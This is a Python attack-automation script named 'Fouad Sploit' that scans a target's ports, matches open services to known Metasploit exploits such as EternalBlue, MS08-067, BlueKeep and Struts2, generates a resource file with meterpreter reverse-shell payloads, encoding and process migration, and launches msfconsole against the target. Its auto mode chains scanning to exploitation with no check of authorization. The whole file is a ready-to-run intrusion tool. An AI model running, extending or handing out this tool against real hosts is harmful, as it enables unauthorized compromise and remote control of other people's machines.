#!/usr/bin/env python3
"""
Fouad Sploit - Advanced Metasploit Automation Tool
Auto-run Metasploit exploits with intelligent port and host selection
"""

import os
import sys
import time
import socket
import random
import subprocess
import argparse
from datetime import datetime
from pathlib import Path

# Color codes for styling
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'


def print_banner():
    """Display the Fouad Sploit banner"""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║  ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗     ███████╗██████╗      ║
║  ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗    ██╔════╝██╔══██╗     ║
║  █████╗  ██║   ██║██║   ██║███████║██║  ██║    ███████╗██████╔╝     ║
║  ██╔══╝  ██║   ██║██║   ██║██╔══██║██║  ██║    ╚════██║██╔═══╝      ║
║  ██║     ╚██████╔╝╚██████╔╝██║  ██║██████╔╝    ███████║██║          ║
║  ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝          ║
║                                                                       ║
║              {Colors.YELLOW}Advanced Metasploit Automation Framework{Colors.CYAN}              ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.GREEN}[+] Version: 2.0{Colors.RESET}
{Colors.GREEN}[+] Author: Fouad{Colors.RESET}
{Colors.GREEN}[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}
{Colors.MAGENTA}[*] Auto-Run Mode: ENABLED{Colors.RESET}
{Colors.MAGENTA}[*] Smart Port Detection: ENABLED{Colors.RESET}
{Colors.MAGENTA}[*] Auto Host Selection: ENABLED{Colors.RESET}
{Colors.CYAN}{'═' * 75}{Colors.RESET}
"""
    print(banner)


def print_status(message, status='info'):
    """Print formatted status messages"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    symbols = {
        'info': f"{Colors.CYAN}[*]{Colors.RESET}",
        'success': f"{Colors.GREEN}[+]{Colors.RESET}",
        'error': f"{Colors.RED}[-]{Colors.RESET}",
        'warning': f"{Colors.YELLOW}[!]{Colors.RESET}",
        'exploit': f"{Colors.MAGENTA}[>]{Colors.RESET}",
    }
    print(f"{symbols.get(status, symbols['info'])} [{timestamp}] {message}")


def get_local_ip():
    """Get the local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"


def scan_port(host, port, timeout=1):
    """Check if a port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False


def detect_open_ports(host, port_range=None):
    """Scan for open ports on target"""
    if port_range is None:
        # Common ports to scan
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
                       993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
    else:
        common_ports = port_range
    
    open_ports = []
    print_status(f"Scanning {len(common_ports)} ports on {host}...", 'info')
    
    for port in common_ports:
        if scan_port(host, port):
            open_ports.append(port)
            print_status(f"Open port found: {port}", 'success')
    
    return open_ports


def get_service_name(port):
    """Get common service name for a port"""
    services = {
        21: 'FTP',
        22: 'SSH',
        23: 'Telnet',
        25: 'SMTP',
        53: 'DNS',
        80: 'HTTP',
        110: 'POP3',
        135: 'MSRPC',
        139: 'NetBIOS',
        143: 'IMAP',
        443: 'HTTPS',
        445: 'SMB',
        993: 'IMAPS',
        995: 'POP3S',
        1433: 'MSSQL',
        1521: 'Oracle',
        3306: 'MySQL',
        3389: 'RDP',
        5432: 'PostgreSQL',
        5900: 'VNC',
        8080: 'HTTP-Proxy',
        8443: 'HTTPS-Alt',
    }
    return services.get(port, f'Unknown-{port}')


def get_exploit_modules():
    """Return a list of popular Metasploit exploit modules"""
    return {
        'smb': [
            'exploit/windows/smb/ms17_010_eternalblue',
            'exploit/windows/smb/ms08_067_netapi',
            'exploit/windows/smb/ms17_010_psexec',
        ],
        'http': [
            'exploit/multi/http/tomcat_mgr_upload',
            'exploit/unix/webapp/php_thumb_shell_upload',
            'exploit/multi/http/struts2_content_type_ognl',
        ],
        'ftp': [
            'exploit/unix/ftp/vsftpd_234_backdoor',
            'exploit/windows/ftp/ms09_053_ftpd_nlst',
        ],
        'ssh': [
            'auxiliary/scanner/ssh/ssh_login',
            'exploit/unix/remote/libssh_auth_bypass',
        ],
        'rdp': [
            'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'auxiliary/scanner/rdp/rdp_scanner',
        ],
        'mysql': [
            'exploit/multi/mysql/mysql_udf_payload',
            'auxiliary/scanner/mysql/mysql_login',
        ],
    }


def suggest_exploits(port):
    """Suggest exploits based on port"""
    exploits = get_exploit_modules()
    service = get_service_name(port).lower()
    
    suggestions = []
    for key, modules in exploits.items():
        if key in service:
            suggestions.extend(modules)
    
    return suggestions if suggestions else ['auxiliary/scanner/portscan/tcp']


def generate_msf_rc(target_host, target_port, lhost, lport, exploit_module, payload_type='windows/meterpreter/reverse_tcp'):
    """Generate Metasploit resource script"""
    rc_content = f"""# Fouad Sploit - Auto-generated Resource Script
# Target: {target_host}:{target_port}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

use {exploit_module}
set RHOSTS {target_host}
set RPORT {target_port}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD {payload_type}
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Advanced Options
set AutoVerifySession true
set InitialAutoRunScript ""
set VERBOSE true

# Exploit Options
exploit -j -z
"""
    return rc_content


def create_resource_file(content, filename='fouad_sploit.rc'):
    """Create a Metasploit resource file"""
    filepath = Path(filename)
    filepath.write_text(content)
    return str(filepath.absolute())


def run_metasploit(rc_file):
    """Execute Metasploit with resource file"""
    print_status("Launching Metasploit Framework...", 'exploit')
    
    # Check if msfconsole is available
    try:
        subprocess.run(['which', 'msfconsole'], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print_status("Metasploit Framework not found! Please install it.", 'error')
        return False
    
    cmd = ['msfconsole', '-q', '-r', rc_file]
    
    print_status(f"Executing: {' '.join(cmd)}", 'info')
    print_status("Starting exploit automation...", 'exploit')
    
    try:
        subprocess.run(cmd)
        return True
    except KeyboardInterrupt:
        print_status("\nExploit interrupted by user", 'warning')
        return False
    except Exception as e:
        print_status(f"Error running Metasploit: {str(e)}", 'error')
        return False


def interactive_mode():
    """Interactive configuration mode"""
    print_status("Entering interactive mode...", 'info')
    
    # Get target host
    target = input(f"\n{Colors.YELLOW}[?] Enter target IP (or press Enter for 127.0.0.1): {Colors.RESET}").strip()
    if not target:
        target = "127.0.0.1"
    
    # Auto-detect or manual port
    print_status(f"Target set to: {target}", 'success')
    choice = input(f"\n{Colors.YELLOW}[?] Auto-detect ports? (y/n): {Colors.RESET}").strip().lower()
    
    if choice == 'y':
        open_ports = detect_open_ports(target)
        if not open_ports:
            print_status("No open ports found. Using default port 445", 'warning')
            target_port = 445
        else:
            print(f"\n{Colors.GREEN}Open Ports Found:{Colors.RESET}")
            for idx, port in enumerate(open_ports, 1):
                print(f"  {idx}. Port {port} - {get_service_name(port)}")
            
            port_choice = input(f"\n{Colors.YELLOW}[?] Select port number (1-{len(open_ports)}): {Colors.RESET}").strip()
            try:
                target_port = open_ports[int(port_choice) - 1]
            except:
                target_port = open_ports[0]
    else:
        port_input = input(f"\n{Colors.YELLOW}[?] Enter target port (default 445): {Colors.RESET}").strip()
        target_port = int(port_input) if port_input else 445
    
    print_status(f"Target port: {target_port} ({get_service_name(target_port)})", 'success')
    
    # Get local host (LHOST)
    local_ip = get_local_ip()
    lhost = input(f"\n{Colors.YELLOW}[?] Enter LHOST (default {local_ip}): {Colors.RESET}").strip()
    if not lhost:
        lhost = local_ip
    
    # Get local port (LPORT)
    lport_input = input(f"\n{Colors.YELLOW}[?] Enter LPORT (default 4444): {Colors.RESET}").strip()
    lport = int(lport_input) if lport_input else 4444
    
    # Suggest exploits
    suggestions = suggest_exploits(target_port)
    print(f"\n{Colors.CYAN}Suggested Exploits:{Colors.RESET}")
    for idx, exploit in enumerate(suggestions[:5], 1):
        print(f"  {idx}. {exploit}")
    
    exploit_input = input(f"\n{Colors.YELLOW}[?] Select exploit (1-{len(suggestions[:5])}) or enter custom: {Colors.RESET}").strip()
    try:
        if exploit_input.isdigit():
            exploit_module = suggestions[int(exploit_input) - 1]
        else:
            exploit_module = exploit_input if exploit_input else suggestions[0]
    except:
        exploit_module = suggestions[0]
    
    # Payload selection
    payloads = [
        'windows/meterpreter/reverse_tcp',
        'windows/meterpreter/reverse_https',
        'linux/x86/meterpreter/reverse_tcp',
        'cmd/unix/reverse',
        'generic/shell_reverse_tcp',
    ]
    
    print(f"\n{Colors.CYAN}Available Payloads:{Colors.RESET}")
    for idx, payload in enumerate(payloads, 1):
        print(f"  {idx}. {payload}")
    
    payload_input = input(f"\n{Colors.YELLOW}[?] Select payload (1-{len(payloads)}): {Colors.RESET}").strip()
    try:
        payload_type = payloads[int(payload_input) - 1]
    except:
        payload_type = payloads[0]
    
    return {
        'target': target,
        'port': target_port,
        'lhost': lhost,
        'lport': lport,
        'exploit': exploit_module,
        'payload': payload_type,
    }


def auto_mode(target=None, auto_scan=True):
    """Fully automatic mode with smart defaults"""
    print_status("Auto-run mode activated", 'exploit')
    
    # Auto-select target
    if not target:
        target = input(f"\n{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}").strip()
        if not target:
            print_status("No target specified. Exiting.", 'error')
            return None
    
    # Auto-detect ports
    if auto_scan:
        open_ports = detect_open_ports(target)
        if not open_ports:
            print_status("No open ports found. Using default port 445", 'warning')
            target_port = 445
        else:
            target_port = open_ports[0]  # Use first open port
            print_status(f"Selected port: {target_port} ({get_service_name(target_port)})", 'success')
    else:
        target_port = 445
    
    # Auto-select local settings
    lhost = get_local_ip()
    lport = random.randint(4444, 5555)  # Random listener port
    
    # Auto-select exploit
    suggestions = suggest_exploits(target_port)
    exploit_module = suggestions[0] if suggestions else 'auxiliary/scanner/portscan/tcp'
    
    # Auto-select payload
    payload_type = 'windows/meterpreter/reverse_tcp'
    
    print_status(f"Auto-configuration complete:", 'success')
    print(f"  {Colors.CYAN}Target:{Colors.RESET} {target}:{target_port}")
    print(f"  {Colors.CYAN}Listener:{Colors.RESET} {lhost}:{lport}")
    print(f"  {Colors.CYAN}Exploit:{Colors.RESET} {exploit_module}")
    print(f"  {Colors.CYAN}Payload:{Colors.RESET} {payload_type}")
    
    return {
        'target': target,
        'port': target_port,
        'lhost': lhost,
        'lport': lport,
        'exploit': exploit_module,
        'payload': payload_type,
    }


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Fouad Sploit - Advanced Metasploit Automation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-t', '--target', help='Target host IP address')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('-l', '--lhost', help='Local host (LHOST)')
    parser.add_argument('-L', '--lport', type=int, help='Local port (LPORT)')
    parser.add_argument('-e', '--exploit', help='Exploit module to use')
    parser.add_argument('-P', '--payload', help='Payload to use')
    parser.add_argument('-a', '--auto', action='store_true', help='Auto mode (automatic configuration)')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan for open ports')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('-o', '--output', default='fouad_sploit.rc', help='Output resource file')
    
    args = parser.parse_args()
    
    # Display banner
    print_banner()
    
    config = None
    
    if args.interactive:
        # Interactive mode
        config = interactive_mode()
    elif args.auto or not args.target:
        # Auto mode
        config = auto_mode(args.target, auto_scan=True)
    else:
        # Manual mode with CLI arguments
        lhost = args.lhost or get_local_ip()
        lport = args.lport or 4444
        
        if args.scan and args.target:
            open_ports = detect_open_ports(args.target)
            target_port = open_ports[0] if open_ports else (args.port or 445)
        else:
            target_port = args.port or 445
        
        suggestions = suggest_exploits(target_port)
        exploit_module = args.exploit or suggestions[0]
        payload_type = args.payload or 'windows/meterpreter/reverse_tcp'
        
        config = {
            'target': args.target,
            'port': target_port,
            'lhost': lhost,
            'lport': lport,
            'exploit': exploit_module,
            'payload': payload_type,
        }
    
    if not config:
        print_status("Configuration failed. Exiting.", 'error')
        return 1
    
    # Generate resource file
    print_status("Generating Metasploit resource script...", 'info')
    rc_content = generate_msf_rc(
        config['target'],
        config['port'],
        config['lhost'],
        config['lport'],
        config['exploit'],
        config['payload']
    )
    
    rc_file = create_resource_file(rc_content, args.output)
    print_status(f"Resource file created: {rc_file}", 'success')
    
    # Display configuration
    print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}Final Configuration:{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
    print(f"  Target Host:    {Colors.WHITE}{config['target']}{Colors.RESET}")
    print(f"  Target Port:    {Colors.WHITE}{config['port']} ({get_service_name(config['port'])}){Colors.RESET}")
    print(f"  Local Host:     {Colors.WHITE}{config['lhost']}{Colors.RESET}")
    print(f"  Local Port:     {Colors.WHITE}{config['lport']}{Colors.RESET}")
    print(f"  Exploit:        {Colors.WHITE}{config['exploit']}{Colors.RESET}")
    print(f"  Payload:        {Colors.WHITE}{config['payload']}{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}\n")
    
    # Confirm execution
    confirm = input(f"{Colors.YELLOW}[?] Launch Metasploit with this configuration? (Y/n): {Colors.RESET}").strip().lower()
    if confirm and confirm != 'y':
        print_status("Execution cancelled by user", 'warning')
        return 0
    
    # Execute
    success = run_metasploit(rc_file)
    
    if success:
        print_status("Exploit execution completed", 'success')
    else:
        print_status("Exploit execution failed", 'error')
        return 1
    
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {str(e)}{Colors.RESET}")
        sys.exit(1)
